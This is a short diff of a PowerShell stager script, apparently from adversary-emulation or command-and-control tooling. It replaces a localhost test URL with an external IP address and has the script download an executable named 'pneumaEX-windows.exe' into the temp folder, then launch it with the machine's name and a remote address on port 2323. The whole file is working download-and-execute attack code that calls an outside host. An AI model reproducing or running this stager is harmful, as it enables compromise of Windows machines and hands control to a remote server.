@@ -1,5 +1,5 @@
-$implant = 'tcalc.exe'
-$url = 'http://localhost:8080', $implant -join '/'
+$implant = 'pneumaEX-windows.exe'
+$url = 'http://20.232.12.130:3391/payloads/pneumaEx', $implant -join '/'
 $file = $env:tmp, $implant -join '\'
 (New-Object System.Net.WebClient).DownloadFile($url, $file);
-[scriptblock]::Create($file).Invoke();
+Start-Process -FilePath $file -ArgumentList "-name $env:COMPUTERNAME -address 20.232.12.130:2323"
